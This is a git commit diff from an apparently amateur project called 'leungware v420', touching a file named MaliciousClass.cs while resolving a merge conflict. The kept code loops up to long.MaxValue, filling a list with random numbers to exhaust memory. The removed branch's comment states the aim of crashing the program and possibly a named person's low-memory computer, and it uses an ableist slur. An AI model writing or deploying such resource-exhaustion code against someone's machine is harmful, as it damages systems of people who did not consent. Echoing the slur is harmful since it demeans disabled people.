30e4308659d97382c755d07f232df3986302f052
Randy Zhu <30359448+RandoNandoz@users.noreply.github.com>
2019-09-23 18:49:20 -0700

    last commit before night i have no idea what the hell im doing help

--- leungware v420/MaliciousClass.cs
+++ leungware v420/MaliciousClass.cs
@@ -17,20 +17,9 @@ namespace leungware_v420
 
         private static Double[] GetData()
         {
-<<<<<<< HEAD
             Random rnd = new Random();
             List<double> valuesDoubles = new List<double>();
             for (long i = 0; i < long.MaxValue; i++)
-=======
-            /* Allocates retard levels of things into memory, effectively crashing the program, and in low memory systems
-             (e.g John's Computer), may cause a total failure of the computer.*/
-            long chunkSize = Int64.MaxValue;
-            long nSizeGetter = Int64.MaxValue;
-            Random random = new Random();
-            long n = 0;
-            double total = 0;
-            for (int i = 0; i <= (long) Math.Ceiling(nSizeGetter * 1.0 / chunkSize) - 1; i++)
->>>>>>> 9f1e30ab311348cca211cb7346f115991f3b928e
             {
                 valuesDoubles.Add(rnd.NextDouble());
             }
